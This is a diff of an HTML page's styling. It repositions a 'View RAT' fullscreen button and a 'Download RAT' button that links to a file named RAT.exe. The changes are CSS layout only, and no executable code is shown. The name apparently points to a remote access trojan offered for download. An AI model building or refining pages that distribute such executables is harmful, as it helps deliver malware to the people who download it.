@@ -21,9 +21,10 @@
       overflow: hidden;
     }
 
-    #fullscreenButton, #downloadButton {
+    #fullscreenButton {
       position: absolute;
       left: 50%;
+      top: 45%;
       transform: translateX(-50%);
       padding: 15px 30px;
       background: #222;
@@ -35,12 +36,18 @@
       z-index: 2;
     }
 
-    #fullscreenButton {
-      top: 45%;
-    }
-
     #downloadButton {
-      top: 70%;
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      padding: 12px 25px;
+      background: #222;
+      color: white;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+      border-radius: 10px;
+      z-index: 2;
       display: none;
     }
 
@@ -55,7 +62,7 @@
 <body>
   <button id="fullscreenButton">View RAT</button>
 
-  <!-- Download button for RAT.exe (make sure the file is uploaded properly) -->
+  <!-- Download button for RAT.exe -->
   <a href="RAT.exe" download>
     <button id="downloadButton">Download RAT</button>
   </a>
